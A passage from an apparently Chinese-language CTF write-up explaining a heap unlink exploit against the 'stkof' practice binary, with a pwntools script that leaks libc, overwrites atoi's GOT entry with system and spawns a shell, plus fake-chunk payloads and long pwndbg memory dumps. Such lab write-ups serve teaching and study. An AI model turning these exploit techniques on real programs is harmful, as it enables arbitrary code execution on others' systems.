= p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload2), payload2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Leaking address...&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;FAIL\n&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;puts address : 0x%x&quot;</span> % puts_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Finding offset in libc...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">puts_offset = libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;atoi offset: 0x%x&quot;</span> % puts_offset)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Calculating libc address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">log.success(<span class="string">&quot;Libc address: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">&quot;Calculating system &amp; /bin/sh address...&quot;</span>)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">log.success(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % binsh)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Changing atoi@got --&gt; system@got...&quot;</span>)</span><br><span class="line">payload3 = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload3) + <span class="number">1</span>, payload3)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Now atoi@got is system@got, so just pass the string &#x27;/bin/sh&#x27; to atoi&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Actually we called system(&#x27;/bin/sh&#x27;) !&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.send(p64(binsh))</span><br><span class="line">log.info(<span class="string">&quot;Ready in 5 seconds...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">log.success(<span class="string">&quot;PWN!!&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1、模仿程序流程写出-payload"><a href="#1、模仿程序流程写出-payload" class="headerlink" title="1、模仿程序流程写出 payload"></a>1、模仿程序流程写出 payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, length, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>

<p>这个很简单，就不再多说了。</p>
<h2 id="2、创建-3-个-chunk"><a href="#2、创建-3-个-chunk" class="headerlink" title="2、创建 3 个 chunk"></a>2、创建 3 个 chunk</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Creating chunk1, avoid stdout&#x27;s buffer.&quot;</span>)</span><br><span class="line">create(<span class="number">0x100</span>) <span class="comment">#0x100==256</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Creating chunk2...&quot;</span>)</span><br><span class="line">create(<span class="number">0x30</span>)  <span class="comment">#0x30==48</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Creating chunk3...&quot;</span>)</span><br><span class="line">create(<span class="number">0x80</span>)  <span class="comment">#0x80==128</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>上面的代码创建了 3 个堆块，使用 gdb 调试进行 malloc，然后 CTRL+c 进入调试模式：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">➜  unlink_data sudo gdb stkof_patch</span><br><span class="line">[<span class="type">sudo</span>] password <span class="keyword">for</span> ubuntu:</span><br><span class="line">GNU gdb (Ubuntu <span class="number">7.11</span>.<span class="number">1</span><span class="literal">-0ubuntu1</span>~<span class="number">16.5</span>) <span class="number">7.11</span>.<span class="number">1</span></span><br><span class="line">Copyright (C) <span class="number">2016</span> Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version <span class="number">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  <span class="built_in">Type</span> <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line"><span class="keyword">For</span> bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"><span class="keyword">For</span> help, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">pwndbg: loaded <span class="number">187</span> commands. <span class="built_in">Type</span> pwndbg [<span class="type">filter</span>] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb functions (can be used with print/<span class="keyword">break</span>)</span><br><span class="line">Reading symbols from stkof_patch...(no debugging symbols found)...done.</span><br><span class="line">pwndbg&gt; <span class="built_in">r</span></span><br><span class="line">Starting program: /home/ubuntu/Desktop/unlink_data/stkof_patch</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">256</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">48</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">128</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">OK</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line"><span class="number">0</span>x00007ffff7b04320 <span class="keyword">in</span> __read_nocancel () at ../sysdeps/unix/syscall<span class="literal">-template</span>.S:<span class="number">84</span></span><br><span class="line"><span class="number">84</span>	../sysdeps/unix/syscall<span class="literal">-template</span>.S: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | <span class="keyword">DATA</span> | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ <span class="type">REGISTERS</span> ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0</span>xfffffffffffffe00</span><br><span class="line"> RBX  <span class="number">0</span>x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— <span class="number">0</span>xfbad2288</span><br><span class="line"> RCX  <span class="number">0</span>x7ffff7b04320 (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="literal">-0xfff</span></span><br><span class="line"> RDX  <span class="number">0</span>x400</span><br><span class="line"> RDI  <span class="number">0</span>x0</span><br><span class="line"> RSI  <span class="number">0</span>xe05010 ◂— <span class="number">0</span>xa383231 /* <span class="string">&#x27;128\n&#x27;</span> */</span><br><span class="line"> R8   <span class="number">0</span>x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— <span class="number">0</span>x0</span><br><span class="line"> R9   <span class="number">0</span>x7ffff7fde700 ◂— <span class="number">0</span>x7ffff7fde700</span><br><span class="line"> R10  <span class="number">0</span>x7ffff7fde700 ◂— <span class="number">0</span>x7ffff7fde700</span><br><span class="line"> R11  <span class="number">0</span>x246</span><br><span class="line"> R12  <span class="number">0</span>xa</span><br><span class="line"> R13  <span class="number">0</span>x9</span><br><span class="line"> R14  <span class="number">0</span>xe05014 ◂— <span class="number">0</span>x0</span><br><span class="line"> R15  <span class="number">0</span>x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— <span class="number">0</span>xfbad2288</span><br><span class="line"> <span class="built_in">RBP</span>  <span class="number">0</span>x7ffff7dd2620 (_IO_2_1_stdout_) ◂— <span class="number">0</span>xfbad2a84</span><br><span class="line"> RSP  <span class="number">0</span>x7fffffffe438 —▸ <span class="number">0</span>x7ffff7a875f8 (_IO_file_underflow+<span class="number">328</span>) ◂— cmp    rax, <span class="number">0</span></span><br><span class="line"> RIP  <span class="number">0</span>x7ffff7b04320 (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="literal">-0xfff</span></span><br><span class="line">───────────────────────────────────[ <span class="type">DISASM</span> ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0</span>x7ffff7b04320 &lt;__read_nocancel+<span class="number">7</span>&gt;     cmp    rax, <span class="literal">-0xfff</span></span><br><span class="line">   <span class="number">0</span>x7ffff7b04326 &lt;__read_nocancel+<span class="number">13</span>&gt;    jae    read+<span class="number">73</span> &lt;read+<span class="number">73</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0</span>x7ffff7b04359 &lt;read+<span class="number">73</span>&gt;               mov    rcx, qword ptr [<span class="type">rip</span> + <span class="number">0</span><span class="type">x2ccb18</span>]</span><br><span class="line">   <span class="number">0</span>x7ffff7b04360 &lt;read+<span class="number">80</span>&gt;               neg    eax</span><br><span class="line">   <span class="number">0</span>x7ffff7b04362 &lt;read+<span class="number">82</span>&gt;               mov    dword ptr fs:[<span class="type">rcx</span>], eax</span><br><span class="line">   <span class="number">0</span>x7ffff7b04365 &lt;read+<span class="number">85</span>&gt;               or     rax, <span class="number">0</span>xffffffffffffffff</span><br><span class="line">   <span class="number">0</span>x7ffff7b04369 &lt;read+<span class="number">89</span>&gt;               ret</span><br><span class="line"></span><br><span class="line">   <span class="number">0</span>x7ffff7b0436a                         nop    word ptr [<span class="type">rax</span> + <span class="type">rax</span>]</span><br><span class="line">   <span class="number">0</span>x7ffff7b04370 &lt;<span class="built_in">write</span>&gt;                 cmp    dword ptr [<span class="type">rip</span> + <span class="number">0</span><span class="type">x2d23c9</span>], <span class="number">0</span> &lt;<span class="number">0</span>x7ffff7dd6740&gt;</span><br><span class="line">   <span class="number">0</span>x7ffff7b04377 &lt;<span class="built_in">write</span>+<span class="number">7</span>&gt;               jne    <span class="built_in">write</span>+<span class="number">25</span> &lt;<span class="built_in">write</span>+<span class="number">25</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0</span>x7ffff7b04389 &lt;<span class="built_in">write</span>+<span class="number">25</span>&gt;              sub    rsp, <span class="number">8</span></span><br><span class="line">───────────────────────────────────[ <span class="type">STACK</span> ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0</span>x7fffffffe438 —▸ <span class="number">0</span>x7ffff7a875f8 (_IO_file_underflow+<span class="number">328</span>) ◂— cmp    rax, <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0</span>x7fffffffe440 —▸ <span class="number">0</span>x7fffffffe650 ◂— <span class="number">0</span>x1</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0</span>x7fffffffe448 —▸ <span class="number">0</span>x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— <span class="number">0</span>xfbad2288</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0</span>x7fffffffe450 —▸ <span class="number">0</span>x7fffffffe500 ◂— <span class="number">0</span>xa31 /* <span class="string">&#x27;1\n&#x27;</span> */</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0</span>x7fffffffe458 —▸ <span class="number">0</span>x7ffff7a8861e (_IO_default_uflow+<span class="number">14</span>) ◂— cmp    eax, <span class="literal">-1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0</span>x7fffffffe460 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0</span>x7fffffffe468 —▸ <span class="number">0</span>x7ffff7a7bc7a (_IO_getline_info+<span class="number">170</span>) ◂— cmp    eax, <span class="literal">-1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0</span>x7fffffffe470 ◂— <span class="number">0</span>x0</span><br><span class="line">─────────────────────────────────[ <span class="type">BACKTRACE</span> ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7</span>ffff7b04320 __read_nocancel+<span class="number">7</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7</span>ffff7a875f8 _IO_file_underflow+<span class="number">328</span></span><br><span class="line">   f <span class="number">2</span>     <span class="number">7</span>ffff7a8861e _IO_default_uflow+<span class="number">14</span></span><br><span class="line">   f <span class="number">3</span>     <span class="number">7</span>ffff7a7bc7a _IO_getline_info+<span class="number">170</span></span><br><span class="line">   f <span class="number">4</span>     <span class="number">7</span>ffff7a7bd88</span><br><span class="line">   f <span class="number">5</span>     <span class="number">7</span>ffff7a7ab8d fgets+<span class="number">173</span></span><br><span class="line">   f <span class="number">6</span>           <span class="number">400</span>d2e</span><br><span class="line">   f <span class="number">7</span>     <span class="number">7</span>ffff7a2d840 __libc_start_main+<span class="number">240</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>看一下 bin 和 heap 的情况：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600857919374-466cb14f-64e6-430f-8e70-a0a2ad14c143.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200923184513.png&originHeight=366&originWidth=143&size=20088&status=done&style=none&width=143" alt="QQ截图20200923184513.png"><br>pwngdb 只显示出了一个堆的大小，可能是 pwngdb 的 bug，不过不影响。查看各个堆块的所在位置：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">1000</span>gx <span class="number">0</span>xe05000</span><br><span class="line"><span class="number">0</span>xe05000:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000411 <span class="comment">#buffer_zone1(缓冲区1)</span></span><br><span class="line"><span class="number">0</span>xe05010:	<span class="number">0</span>x000000000a383231	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05020:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05030:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe05410:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000111 <span class="comment">#chunk1：malloc(0x100)</span></span><br><span class="line"><span class="number">0</span>xe05420:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05430:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05440:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe05520:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000411 <span class="comment">#buffer_zone2(缓冲区2)</span></span><br><span class="line"><span class="number">0</span>xe05530:	<span class="number">0</span>x00000000000a4b4f	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05540:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05550:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe05930:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000041 <span class="comment">#chunk2：malloc(0x30)</span></span><br><span class="line"><span class="number">0</span>xe05940:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05950:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05960:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05970:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000091 <span class="comment">#chunk3：malloc(0x80)</span></span><br><span class="line"><span class="number">0</span>xe05980:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05990:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe05a00:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000020601 <span class="comment">#top_chunk</span></span><br><span class="line"><span class="number">0</span>xe05a10:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05a20:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>xe06f30:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>在前面我们创建了 3 个 chunk，但是经过 gdb 发现程序实际上创建了 5 个 chunk（不计入 top_chunk）。<br>多出来的两个 chunk 其实是由于程序本身没有进行 setbuf 操作，所以在初次执行输入输出操作（fget 函数和 printf 函数）的时候会申请缓冲区。</p>
<h2 id="3、创建一个-fake-chunk"><a href="#3、创建一个-fake-chunk" class="headerlink" title="3、创建一个 fake_chunk"></a>3、创建一个 fake_chunk</h2><p>从上面的堆情况可以看到，缓冲区 2 将 chunk1 与 chunk2 分隔开，如果要想控制 chunk1 就必须控制缓冲区 2，而缓冲区 2 怎么控制？emmm，不会..<br>但是 chunk2 和 chunk3 的内存地址是紧邻在一起的，如果在 chunk2 中伪造一个 fake_chunk，将 chunk3 释放之后就会与 fake_chunk 合并，嗯，就这样。<br><strong>但是如果想要利用 unlink 的方式，那势必要有一个空闲块。</strong>但是我们都是 malloc 申请的 chunk，哪来的空闲块？的确没有，但是我们可以进行伪造。假如说我们在某一个内存区域的 data 部分伪造一个 fake_chunk，并且这个 fake_chunk 处于释放的状态。通过堆溢出的方式修改相邻内存堆块的 prev_size 和 size 的 p 标志位，使得在释放相邻内存堆块的时候发生向前合并，这样就能触发 unlink 了。对应到 chunk2 和 chunk3，其图解如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601193174944-de3b07ab-68a6-4f36-af70-eb2d1267c8f9.png#align=left&display=inline&height=608&margin=%5Bobject%20Object%5D&originHeight=608&originWidth=1986&size=0&status=done&style=none&width=1986"></p>
<blockquote>
<p>关于 p 标志位：<br><code>P（PREV_INUSE）</code>：记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。<br>上图的 fake_chunk 的 next_prev 和 next_size 指的是：fd_nextsize， bk_nextsize</p>
</blockquote>
<p>如果想要构造一个能人为触发 unlink 的 fake_chunk，那么这个 fake_chunk 的大小至少为：</p>
<ul>
<li>0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30</li>
</ul>
<p>为了能够使得在释放“chunk3”的时候能够绕过检查向前合并 fake_chunk，那么 chunk3 的 prev_size 就要等于 fake_chunk 的 size 大小，即 0x30，这样才能说明前一个 chunk(fake_chunk)是释放状态。（原因请参照 p 标志位）。</p>
<blockquote>
<p>注意：只有空闲的（被 free 掉的）large_chunk 才有 fd 与 bk 指针，fd_nextsize， bk_nextsize 也是如此。</p>
</blockquote>
<p>若想要触发 unlink，那么相邻内存的大小就必须超过 fastbin 的最大值，所以相邻内存的大小至少是 0x90，并且 size 的 P 标志位必须为 0。payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Creating fake chunk...&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x602140</span> + <span class="number">16</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602140</span> + <span class="number">16</span> - <span class="number">0x10</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>但是到此还不知道程序写入 payload 的位置，可以使用程序的编辑功能来查看一下，输入任意长度的字符串：<br>这里我输入的是：aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">2</span></span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">FAIL</span><br><span class="line">FAIL</span><br><span class="line">FAIL</span><br><span class="line">FAIL</span><br><span class="line">FAIL</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line"><span class="number">0</span>x00007ffff7b04320 <span class="keyword">in</span> __read_nocancel () at ../sysdeps/unix/syscall<span class="literal">-template</span>.S:<span class="number">84</span></span><br><span class="line"><span class="number">84</span>	<span class="keyword">in</span> ../sysdeps/unix/syscall<span class="literal">-template</span>.S</span><br><span class="line">LEGEND: STACK | HEAP | CODE | <span class="keyword">DATA</span> | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ <span class="type">REGISTERS</span> ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0</span>xfffffffffffffe00</span><br><span class="line"> RBX  <span class="number">0</span>x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— <span class="number">0</span>xfbad2288</span><br><span class="line"> RCX  <span 